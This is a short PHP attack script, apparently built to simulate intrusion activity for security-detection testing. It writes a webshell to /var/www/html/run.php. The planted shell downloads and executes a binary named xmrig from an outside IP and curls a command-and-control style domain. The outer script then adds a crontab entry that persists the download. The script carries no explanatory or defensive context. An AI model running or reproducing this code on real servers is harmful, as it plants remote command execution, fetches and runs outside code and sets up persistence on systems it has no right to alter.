<?php
echo "Injecting a webshell under /var/www/html/run.php\n\n";
file_put_contents('/var/www/html/run.php',
                  '<?php echo "Running discovery commands and tools.\n\n";
                         shell_exec("uname -a > /tmp/output");
                         echo "Downloading and executing malware\n\n";
                         shell_exec("wget http://203.0.113.1:33333/ls -O /tmp/xmrig; chmod +x /tmp/xmrig; /tmp/xmrig; cp /bin/ls /tmp/nmap; chmod +x /tmp/nmap; /tmp/nmap; curl --connect-timeout 1 http://c2.guarddutyc2activityb.com/")
                  ?>');
                         echo "Persisting malware as a cron job\n\n";
                         shell_exec("echo \"0 0 * * * /tmp/xmrig\" > /tmp/run && crontab /tmp/run");

echo "File run.php created successfully. Visit /run.php to execute system command.";
?>
